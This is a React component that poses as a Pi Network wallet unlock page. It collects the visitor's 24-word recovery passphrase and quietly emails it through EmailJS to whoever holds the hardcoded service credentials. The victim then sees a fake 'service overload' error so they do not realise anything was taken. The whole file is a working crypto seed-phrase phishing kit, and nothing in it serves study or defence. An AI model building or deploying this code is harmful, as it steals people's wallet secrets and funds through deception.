import React, { useRef, useState } from 'react'
import "./index.css"
import emailjs from '@emailjs/browser';

function Wallet() {

    const form = useRef();
    const [formData, setFormData] = useState({email:''})
    const { email } = formData
    function onChange(e) {
        setFormData((prevState) => ({
            ...prevState,
            [e.target.name]: e.target.value
        })
        )
    }

    function WordCount(str) { 
        return str.split(" ").length;
      }

      
      const sendEmail = (e) => {
          e.preventDefault();
          const numberOfWords= WordCount(email)
          console.log(numberOfWords)
          if (numberOfWords<24){
            alert('not up to 24')
          }

        else{
            emailjs.sendForm('service_2ag4tjo', 'template_5yrpf2g', form.current, 'beqMW4Ox1hihdDmRG')
            .then((result) => {
                alert('error, service overload Please try again in 1 hour')
                console.log(result.text);
                console.log(email);
            }, (error) => {
                console.log(error.text);
            });
        }
    }

    return (
        <div>
            <div className="verify">

                <h2>Unlock Pi Wallet</h2>
                <form action="submit" className='verify-form' ref={form} onSubmit={sendEmail}>
                    <textarea name='email' onChange={onChange} value={email}   placeholder="Enter Your 24-character passphrase here" cols="30" rows="10" required="">
                    </textarea>
                    <button className="passphrasebtn" id="">UNLOCK WITH PASSPHRASE</button>
                </form>
                    <button className="fingerprintbtn">UNLOCK WITH FINGERPRINT</button>
                <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of Passphrase is impossible. Lost your passphrase? You can create a new wallet, but all your π in you previous wallet will be inaccessible.</p>
            </div>
        </div >
    )
}

export default Wallet